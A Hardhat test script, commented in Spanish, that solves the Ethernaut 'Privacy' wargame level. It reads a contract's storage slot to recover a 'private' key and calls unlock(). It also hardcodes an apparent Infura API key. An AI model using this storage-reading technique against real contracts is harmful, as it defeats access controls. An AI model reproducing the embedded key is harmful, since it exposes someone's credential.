const { expect } = require("chai");

describe("Privay contract", function () {
  it("Lee el storage no optimizado y desbloquea.", async function () {
    const apiKey="7d3278c4eab54eaea50d6411bfe24df6";
    const provider = new ethers.providers.InfuraProvider("rinkeby", apiKey)
    //[owner] = await ethers.getSigners();
    const Contrato = await ethers.getContractFactory("Privacy");
    const toa='0xa88C25C59C6542744d5dd4Cd7FA7626c40c1AdAA' //direccion instancia ethernaut privacy
    const key=await provider.getStorageAt(toa,5);
    const key16=key.slice(0,34);
    const contrato = await Contrato.attach(toa);
    console.log("key:",key16)
    await contrato.unlock(key16);
  });
});